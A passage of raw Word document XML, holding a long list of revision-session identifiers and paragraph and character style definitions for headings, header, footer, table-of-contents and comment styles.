    <w:rsid w:val="008E5FF4"/>
    <w:rsid w:val="008E69E4"/>
    <w:rsid w:val="008E7053"/>
    <w:rsid w:val="008E769D"/>
    <w:rsid w:val="00900BDB"/>
    <w:rsid w:val="00902A4F"/>
    <w:rsid w:val="00910956"/>
    <w:rsid w:val="0091160E"/>
    <w:rsid w:val="009118F1"/>
    <w:rsid w:val="0091341E"/>
    <w:rsid w:val="009213A0"/>
    <w:rsid w:val="00926A68"/>
    <w:rsid w:val="00931400"/>
    <w:rsid w:val="00935B3E"/>
    <w:rsid w:val="00940644"/>
    <w:rsid w:val="0095233C"/>
    <w:rsid w:val="0095261E"/>
    <w:rsid w:val="0095424B"/>
    <w:rsid w:val="00955C37"/>
    <w:rsid w:val="00956AFF"/>
    <w:rsid w:val="00970B47"/>
    <w:rsid w:val="009744B7"/>
    <w:rsid w:val="009745DF"/>
    <w:rsid w:val="009806D0"/>
    <w:rsid w:val="009865DB"/>
    <w:rsid w:val="00986AC8"/>
    <w:rsid w:val="00990483"/>
    <w:rsid w:val="00993897"/>
    <w:rsid w:val="00995FA5"/>
    <w:rsid w:val="009A10B1"/>
    <w:rsid w:val="009A169C"/>
    <w:rsid w:val="009A557C"/>
    <w:rsid w:val="009A7ADE"/>
    <w:rsid w:val="009B4524"/>
    <w:rsid w:val="009B6425"/>
    <w:rsid w:val="009C01C4"/>
    <w:rsid w:val="009C188C"/>
    <w:rsid w:val="009C1F3C"/>
    <w:rsid w:val="009C53B1"/>
    <w:rsid w:val="009C77F7"/>
    <w:rsid w:val="009D027C"/>
    <w:rsid w:val="009D4D09"/>
    <w:rsid w:val="009E4731"/>
    <w:rsid w:val="009E60BD"/>
    <w:rsid w:val="009F5467"/>
    <w:rsid w:val="009F6C19"/>
    <w:rsid w:val="009F6D69"/>
    <w:rsid w:val="00A00856"/>
    <w:rsid w:val="00A01E44"/>
    <w:rsid w:val="00A04160"/>
    <w:rsid w:val="00A06C84"/>
    <w:rsid w:val="00A07387"/>
    <w:rsid w:val="00A174B4"/>
    <w:rsid w:val="00A17E99"/>
    <w:rsid w:val="00A20074"/>
    <w:rsid w:val="00A213D6"/>
    <w:rsid w:val="00A21AAD"/>
    <w:rsid w:val="00A300E3"/>
    <w:rsid w:val="00A34036"/>
    <w:rsid w:val="00A353F5"/>
    <w:rsid w:val="00A36592"/>
    <w:rsid w:val="00A377B4"/>
    <w:rsid w:val="00A40478"/>
    <w:rsid w:val="00A428FF"/>
    <w:rsid w:val="00A43218"/>
    <w:rsid w:val="00A44698"/>
    <w:rsid w:val="00A45EC3"/>
    <w:rsid w:val="00A45FB0"/>
    <w:rsid w:val="00A504CA"/>
    <w:rsid w:val="00A5077E"/>
    <w:rsid w:val="00A511FD"/>
    <w:rsid w:val="00A51732"/>
    <w:rsid w:val="00A51A63"/>
    <w:rsid w:val="00A57A6D"/>
    <w:rsid w:val="00A63856"/>
    <w:rsid w:val="00A63DDE"/>
    <w:rsid w:val="00A70299"/>
    <w:rsid w:val="00A74113"/>
    <w:rsid w:val="00A74809"/>
    <w:rsid w:val="00A7517C"/>
    <w:rsid w:val="00A753BC"/>
    <w:rsid w:val="00A75ADF"/>
    <w:rsid w:val="00A76F32"/>
    <w:rsid w:val="00A80DE7"/>
    <w:rsid w:val="00A86C79"/>
    <w:rsid w:val="00A8750E"/>
    <w:rsid w:val="00A87DB0"/>
    <w:rsid w:val="00A950E4"/>
    <w:rsid w:val="00AA1A0E"/>
    <w:rsid w:val="00AA7404"/>
    <w:rsid w:val="00AA7BEE"/>
    <w:rsid w:val="00AB152B"/>
    <w:rsid w:val="00AB233D"/>
    <w:rsid w:val="00AB556C"/>
    <w:rsid w:val="00AC0083"/>
    <w:rsid w:val="00AC023C"/>
    <w:rsid w:val="00AC2449"/>
    <w:rsid w:val="00AC246D"/>
    <w:rsid w:val="00AC4888"/>
    <w:rsid w:val="00AC54BB"/>
    <w:rsid w:val="00AD4F64"/>
    <w:rsid w:val="00AD6ECC"/>
    <w:rsid w:val="00AD77C6"/>
    <w:rsid w:val="00AD7C72"/>
    <w:rsid w:val="00AE055D"/>
    <w:rsid w:val="00AE2BE5"/>
    <w:rsid w:val="00AF4224"/>
    <w:rsid w:val="00AF4635"/>
    <w:rsid w:val="00AF5C95"/>
    <w:rsid w:val="00B000F8"/>
    <w:rsid w:val="00B0284D"/>
    <w:rsid w:val="00B074E1"/>
    <w:rsid w:val="00B15D91"/>
    <w:rsid w:val="00B166C3"/>
    <w:rsid w:val="00B20EB8"/>
    <w:rsid w:val="00B20EF8"/>
    <w:rsid w:val="00B23767"/>
    <w:rsid w:val="00B24562"/>
    <w:rsid w:val="00B309BC"/>
    <w:rsid w:val="00B317F4"/>
    <w:rsid w:val="00B4186B"/>
    <w:rsid w:val="00B43A39"/>
    <w:rsid w:val="00B4401E"/>
    <w:rsid w:val="00B51B7C"/>
    <w:rsid w:val="00B53BF5"/>
    <w:rsid w:val="00B54B27"/>
    <w:rsid w:val="00B54DAE"/>
    <w:rsid w:val="00B5676D"/>
    <w:rsid w:val="00B63A4D"/>
    <w:rsid w:val="00B6669B"/>
    <w:rsid w:val="00B70AAE"/>
    <w:rsid w:val="00B70B17"/>
    <w:rsid w:val="00B71518"/>
    <w:rsid w:val="00B7221C"/>
    <w:rsid w:val="00B76541"/>
    <w:rsid w:val="00B76B63"/>
    <w:rsid w:val="00B840DC"/>
    <w:rsid w:val="00B852C0"/>
    <w:rsid w:val="00B90AB1"/>
    <w:rsid w:val="00B915A3"/>
    <w:rsid w:val="00B93B63"/>
    <w:rsid w:val="00B94EB7"/>
    <w:rsid w:val="00B95362"/>
    <w:rsid w:val="00B97B1D"/>
    <w:rsid w:val="00BA10F1"/>
    <w:rsid w:val="00BA1C8A"/>
    <w:rsid w:val="00BA2996"/>
    <w:rsid w:val="00BA4726"/>
    <w:rsid w:val="00BA7D85"/>
    <w:rsid w:val="00BB3648"/>
    <w:rsid w:val="00BB3EA3"/>
    <w:rsid w:val="00BB3F7A"/>
    <w:rsid w:val="00BB6547"/>
    <w:rsid w:val="00BB65E2"/>
    <w:rsid w:val="00BB67C5"/>
    <w:rsid w:val="00BB6AB3"/>
    <w:rsid w:val="00BC3E71"/>
    <w:rsid w:val="00BC7CED"/>
    <w:rsid w:val="00BC7EFA"/>
    <w:rsid w:val="00BD2A3E"/>
    <w:rsid w:val="00BD5B8F"/>
    <w:rsid w:val="00BE0F66"/>
    <w:rsid w:val="00BF0C52"/>
    <w:rsid w:val="00BF1759"/>
    <w:rsid w:val="00BF1904"/>
    <w:rsid w:val="00BF377E"/>
    <w:rsid w:val="00C01287"/>
    <w:rsid w:val="00C015F9"/>
    <w:rsid w:val="00C02367"/>
    <w:rsid w:val="00C10994"/>
    <w:rsid w:val="00C10B87"/>
    <w:rsid w:val="00C120EA"/>
    <w:rsid w:val="00C122CE"/>
    <w:rsid w:val="00C1346A"/>
    <w:rsid w:val="00C164B4"/>
    <w:rsid w:val="00C17DBB"/>
    <w:rsid w:val="00C24CD4"/>
    <w:rsid w:val="00C25842"/>
    <w:rsid w:val="00C32D5D"/>
    <w:rsid w:val="00C330C8"/>
    <w:rsid w:val="00C34203"/>
    <w:rsid w:val="00C37443"/>
    <w:rsid w:val="00C403DB"/>
    <w:rsid w:val="00C42149"/>
    <w:rsid w:val="00C43AB3"/>
    <w:rsid w:val="00C44730"/>
    <w:rsid w:val="00C47059"/>
    <w:rsid w:val="00C52086"/>
    <w:rsid w:val="00C550F2"/>
    <w:rsid w:val="00C55B9E"/>
    <w:rsid w:val="00C577BB"/>
    <w:rsid w:val="00C614A1"/>
    <w:rsid w:val="00C615E3"/>
    <w:rsid w:val="00C62044"/>
    <w:rsid w:val="00C6590B"/>
    <w:rsid w:val="00C70594"/>
    <w:rsid w:val="00C71670"/>
    <w:rsid w:val="00C71DD2"/>
    <w:rsid w:val="00C71E1C"/>
    <w:rsid w:val="00C72591"/>
    <w:rsid w:val="00C87ED7"/>
    <w:rsid w:val="00C919CF"/>
    <w:rsid w:val="00C91BB9"/>
    <w:rsid w:val="00C964E5"/>
    <w:rsid w:val="00CA395B"/>
    <w:rsid w:val="00CA5588"/>
    <w:rsid w:val="00CA75FF"/>
    <w:rsid w:val="00CB4E5E"/>
    <w:rsid w:val="00CB761D"/>
    <w:rsid w:val="00CC08CE"/>
    <w:rsid w:val="00CC0FE8"/>
    <w:rsid w:val="00CC55E1"/>
    <w:rsid w:val="00CD0BF9"/>
    <w:rsid w:val="00CD29BC"/>
    <w:rsid w:val="00CD343E"/>
    <w:rsid w:val="00CD6927"/>
    <w:rsid w:val="00CE2493"/>
    <w:rsid w:val="00CE6287"/>
    <w:rsid w:val="00CE6983"/>
    <w:rsid w:val="00CF1757"/>
    <w:rsid w:val="00CF1F2A"/>
    <w:rsid w:val="00CF2AFA"/>
    <w:rsid w:val="00CF53B4"/>
    <w:rsid w:val="00D0432A"/>
    <w:rsid w:val="00D068A9"/>
    <w:rsid w:val="00D1086A"/>
    <w:rsid w:val="00D110C4"/>
    <w:rsid w:val="00D11C1A"/>
    <w:rsid w:val="00D136CB"/>
    <w:rsid w:val="00D14B88"/>
    <w:rsid w:val="00D1518B"/>
    <w:rsid w:val="00D169B1"/>
    <w:rsid w:val="00D17FFD"/>
    <w:rsid w:val="00D24BAD"/>
    <w:rsid w:val="00D250AC"/>
    <w:rsid w:val="00D25EAF"/>
    <w:rsid w:val="00D26144"/>
    <w:rsid w:val="00D30113"/>
    <w:rsid w:val="00D3069A"/>
    <w:rsid w:val="00D30EF3"/>
    <w:rsid w:val="00D34030"/>
    <w:rsid w:val="00D34764"/>
    <w:rsid w:val="00D40604"/>
    <w:rsid w:val="00D45557"/>
    <w:rsid w:val="00D4672E"/>
    <w:rsid w:val="00D551F7"/>
    <w:rsid w:val="00D56554"/>
    <w:rsid w:val="00D60049"/>
    <w:rsid w:val="00D601EB"/>
    <w:rsid w:val="00D64AFA"/>
    <w:rsid w:val="00D65722"/>
    <w:rsid w:val="00D65E65"/>
    <w:rsid w:val="00D664EC"/>
    <w:rsid w:val="00D70101"/>
    <w:rsid w:val="00D7115C"/>
    <w:rsid w:val="00D71ED1"/>
    <w:rsid w:val="00D7265B"/>
    <w:rsid w:val="00D74373"/>
    <w:rsid w:val="00D74B2C"/>
    <w:rsid w:val="00D74FFF"/>
    <w:rsid w:val="00D806EC"/>
    <w:rsid w:val="00D84304"/>
    <w:rsid w:val="00DA138E"/>
    <w:rsid w:val="00DA7AE2"/>
    <w:rsid w:val="00DB0871"/>
    <w:rsid w:val="00DB0BEB"/>
    <w:rsid w:val="00DB1806"/>
    <w:rsid w:val="00DB7959"/>
    <w:rsid w:val="00DC0AA3"/>
    <w:rsid w:val="00DC13EC"/>
    <w:rsid w:val="00DC3BFD"/>
    <w:rsid w:val="00DC4DB3"/>
    <w:rsid w:val="00DC55FB"/>
    <w:rsid w:val="00DC61AB"/>
    <w:rsid w:val="00DC7B81"/>
    <w:rsid w:val="00DD0258"/>
    <w:rsid w:val="00DD1AA6"/>
    <w:rsid w:val="00DD612B"/>
    <w:rsid w:val="00DE2572"/>
    <w:rsid w:val="00DE3F2F"/>
    <w:rsid w:val="00DE45F0"/>
    <w:rsid w:val="00DE4B75"/>
    <w:rsid w:val="00DE7522"/>
    <w:rsid w:val="00DF127F"/>
    <w:rsid w:val="00E00E9B"/>
    <w:rsid w:val="00E01870"/>
    <w:rsid w:val="00E026F5"/>
    <w:rsid w:val="00E02798"/>
    <w:rsid w:val="00E0412C"/>
    <w:rsid w:val="00E070CA"/>
    <w:rsid w:val="00E0749B"/>
    <w:rsid w:val="00E12780"/>
    <w:rsid w:val="00E13AAC"/>
    <w:rsid w:val="00E1464E"/>
    <w:rsid w:val="00E14ADB"/>
    <w:rsid w:val="00E210AC"/>
    <w:rsid w:val="00E21175"/>
    <w:rsid w:val="00E22232"/>
    <w:rsid w:val="00E22447"/>
    <w:rsid w:val="00E25BB4"/>
    <w:rsid w:val="00E2754B"/>
    <w:rsid w:val="00E370F0"/>
    <w:rsid w:val="00E37387"/>
    <w:rsid w:val="00E4036A"/>
    <w:rsid w:val="00E44F80"/>
    <w:rsid w:val="00E45F6E"/>
    <w:rsid w:val="00E528C4"/>
    <w:rsid w:val="00E53356"/>
    <w:rsid w:val="00E5353D"/>
    <w:rsid w:val="00E53DA4"/>
    <w:rsid w:val="00E548FA"/>
    <w:rsid w:val="00E552DA"/>
    <w:rsid w:val="00E56E10"/>
    <w:rsid w:val="00E62023"/>
    <w:rsid w:val="00E62771"/>
    <w:rsid w:val="00E64327"/>
    <w:rsid w:val="00E64714"/>
    <w:rsid w:val="00E65BAB"/>
    <w:rsid w:val="00E7012B"/>
    <w:rsid w:val="00E709A1"/>
    <w:rsid w:val="00E729BA"/>
    <w:rsid w:val="00E72D00"/>
    <w:rsid w:val="00E73492"/>
    <w:rsid w:val="00E73AE3"/>
    <w:rsid w:val="00E81534"/>
    <w:rsid w:val="00E823C2"/>
    <w:rsid w:val="00E87672"/>
    <w:rsid w:val="00E93EE5"/>
    <w:rsid w:val="00EA0ED5"/>
    <w:rsid w:val="00EA25F3"/>
    <w:rsid w:val="00EA5875"/>
    <w:rsid w:val="00EB176F"/>
    <w:rsid w:val="00EB523E"/>
    <w:rsid w:val="00EB562E"/>
    <w:rsid w:val="00EB72BE"/>
    <w:rsid w:val="00EB7313"/>
    <w:rsid w:val="00EC3F6B"/>
    <w:rsid w:val="00EC45EC"/>
    <w:rsid w:val="00EC5E6E"/>
    <w:rsid w:val="00EC7B64"/>
    <w:rsid w:val="00ED0B45"/>
    <w:rsid w:val="00ED277A"/>
    <w:rsid w:val="00ED3282"/>
    <w:rsid w:val="00ED4381"/>
    <w:rsid w:val="00ED4A90"/>
    <w:rsid w:val="00ED5380"/>
    <w:rsid w:val="00EE2DDE"/>
    <w:rsid w:val="00EE62D6"/>
    <w:rsid w:val="00EF221A"/>
    <w:rsid w:val="00EF2EBA"/>
    <w:rsid w:val="00EF3BAB"/>
    <w:rsid w:val="00EF5C89"/>
    <w:rsid w:val="00F0256B"/>
    <w:rsid w:val="00F03103"/>
    <w:rsid w:val="00F03265"/>
    <w:rsid w:val="00F03691"/>
    <w:rsid w:val="00F0551D"/>
    <w:rsid w:val="00F07BFF"/>
    <w:rsid w:val="00F1114D"/>
    <w:rsid w:val="00F116E0"/>
    <w:rsid w:val="00F15B47"/>
    <w:rsid w:val="00F237D0"/>
    <w:rsid w:val="00F260C7"/>
    <w:rsid w:val="00F30C65"/>
    <w:rsid w:val="00F3370B"/>
    <w:rsid w:val="00F33A84"/>
    <w:rsid w:val="00F33FD9"/>
    <w:rsid w:val="00F358CC"/>
    <w:rsid w:val="00F46ECE"/>
    <w:rsid w:val="00F473B7"/>
    <w:rsid w:val="00F50CBA"/>
    <w:rsid w:val="00F51833"/>
    <w:rsid w:val="00F51E48"/>
    <w:rsid w:val="00F52ACA"/>
    <w:rsid w:val="00F5614E"/>
    <w:rsid w:val="00F62EC0"/>
    <w:rsid w:val="00F62F63"/>
    <w:rsid w:val="00F63656"/>
    <w:rsid w:val="00F647A5"/>
    <w:rsid w:val="00F82CDC"/>
    <w:rsid w:val="00F83DE1"/>
    <w:rsid w:val="00F8588C"/>
    <w:rsid w:val="00F86EF7"/>
    <w:rsid w:val="00F8720C"/>
    <w:rsid w:val="00F91646"/>
    <w:rsid w:val="00F933AA"/>
    <w:rsid w:val="00F93B32"/>
    <w:rsid w:val="00FA1590"/>
    <w:rsid w:val="00FA4027"/>
    <w:rsid w:val="00FB0076"/>
    <w:rsid w:val="00FB3AC4"/>
    <w:rsid w:val="00FB3D74"/>
    <w:rsid w:val="00FB4B81"/>
    <w:rsid w:val="00FB6CA6"/>
    <w:rsid w:val="00FC1CFE"/>
    <w:rsid w:val="00FC414B"/>
    <w:rsid w:val="00FD083C"/>
    <w:rsid w:val="00FD14C8"/>
    <w:rsid w:val="00FD1A5C"/>
    <w:rsid w:val="00FD5CD8"/>
    <w:rsid w:val="00FD63ED"/>
    <w:rsid w:val="00FE141D"/>
    <w:rsid w:val="00FE1BC9"/>
    <w:rsid w:val="00FE66EA"/>
    <w:rsid w:val="00FE6D05"/>
    <w:rsid w:val="00FE7C09"/>
    <w:rsid w:val="00FF1740"/>
    <w:rsid w:val="00FF2185"/>
    <w:rsid w:val="00FF21A4"/>
    <w:rsid w:val="00FF4A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6F82A5"/>
  <w15:docId w15:val="{BAEB6BF4-F85C-434F-AE1F-FADF574D1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B57"/>
    <w:pPr>
      <w:spacing w:line="276" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="000537E5"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="240" w:after="120"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="000537E5"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="240" w:after="120"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="000537E5"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="240" w:after="120"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading4Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00C577BB"/>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28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01287"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00ED3282"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00ED3282"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="007F2B57"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
      <w:spacing w:before="60" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="007F2B57"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00C577BB"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="000537E5"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="000537E5"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="000537E5"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00C577BB"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="4F81BD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00C577BB"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:color w:val="243F60"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:link w:val="Heading6"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00C577BB"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="243F60"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading7Char">
    <w:name w:val="Heading 7 Char"/>
    <w:link w:val="Heading7"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00C577BB"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading8Char">
    <w:name w:val="Heading 8 Char"/>
    <w:link w:val="Heading8"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00C577BB"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:color w:val="4F81BD"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading9Char">
    <w:name w:val="Heading 9 Char"/>
    <w:link w:val="Heading9"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00C577BB"/>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C577BB"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="4F81BD"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="007E5769"/>
    <w:pPr>
      <w:spacing w:before="360" w:after="240"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="36"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="HeadingStyle1">
    <w:name w:val="Heading Style 1"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeadingStyle1Char"/>
    <w:qFormat/>
    <w:rsid w:val="000537E5"/>
    <w:pPr>
      <w:spacing w:before="240" w:after="120" w:line="240" w:lineRule="auto"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeadingStyle1Char">
    <w:name w:val="Heading Style 1 Char"/>
    <w:link w:val="HeadingStyle1"/>
    <w:rsid w:val="000537E5"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:sz w:val="32"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00F62EC0"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="216"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="0067050A"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="660"/>
        <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
      </w:tabs>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:bCs/>
      <w:noProof/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00393D87"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
      </w:tabs>
      <w:spacing w:after="120"/>
      <w:ind w:left="446"/>
    </w:pPr>
    <w:rPr>
      <w:iCs/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00BF377E"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00BF377E"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
